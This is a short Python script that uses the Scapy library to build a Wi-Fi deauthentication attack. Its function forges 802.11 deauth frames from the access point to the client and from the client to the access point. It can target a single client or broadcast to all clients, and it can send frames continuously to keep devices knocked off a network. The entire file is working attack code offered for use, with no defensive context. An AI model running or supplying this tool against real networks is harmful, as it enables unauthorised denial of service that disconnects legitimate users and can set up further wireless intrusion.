from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def deauth_attack(iface, ap_mac, client_mac=None, count=100):
    target = client_mac if client_mac else "ff:ff:ff:ff:ff:ff"

    # Deauth packet: AP → Client
    pkt1 = RadioTap() / Dot11(
        type=0, subtype=12,
        addr1=target,
        addr2=ap_mac,
        addr3=ap_mac
    ) / Dot11Deauth(reason=7)

    # Deauth packet: Client → AP (bidirectional = more effective)
    pkt2 = RadioTap() / Dot11(
        type=0, subtype=12,
        addr1=ap_mac,
        addr2=target,
        addr3=ap_mac
    ) / Dot11Deauth(reason=7)

    label = client_mac if client_mac else "ALL clients (broadcast)"
    loop = (count == 0)

    print(f"[*] Sending deauth frames to: {label}")
    print(f"[*] Target AP: {ap_mac}")
    print(f"[*] Count: {'Continuous' if loop else count} | Press Ctrl+C to stop")

    sendp([pkt1, pkt2], iface=iface, count=0 if loop else count,
          loop=int(loop), inter=0.01, verbose=False)

    print("[+] Deauth complete")
